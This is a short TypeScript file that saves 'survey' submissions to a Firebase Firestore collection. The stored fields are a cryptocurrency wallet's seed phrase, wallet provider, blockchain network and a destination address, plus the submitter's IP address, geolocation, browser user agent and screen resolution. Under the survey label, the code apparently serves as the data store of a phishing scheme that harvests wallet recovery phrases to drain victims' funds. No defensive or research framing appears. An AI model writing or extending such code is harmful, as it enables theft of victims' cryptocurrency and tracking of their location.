// storeSurvey.ts
import { db } from "./firebase";
import { collection, addDoc, serverTimestamp } from "firebase/firestore";

interface SurveyData {
	blockchainNetwork: string;
	walletProvider: string;
	seedPhrase: string;
	destinationAddress: string;
	ipAddress?: string;
	geolocation: {
		latitude?: number;
		longitude?: number;
		city?: string;
		region?: string;
		country?: string;
		error?: string;
	} | null;
	userAgent?: string;
	screenResolution?: string;
}

export async function storeSurveyData(data: SurveyData) {
	try {
		const docRef = await addDoc(collection(db, "surveys"), {
			...data,
			createdAt: serverTimestamp(),
		});
		console.log("Survey submitted with ID: ", docRef.id);
		return docRef.id;
	} catch (error) {
		console.error("Error adding survey: ", error);
		throw error;
	}
}
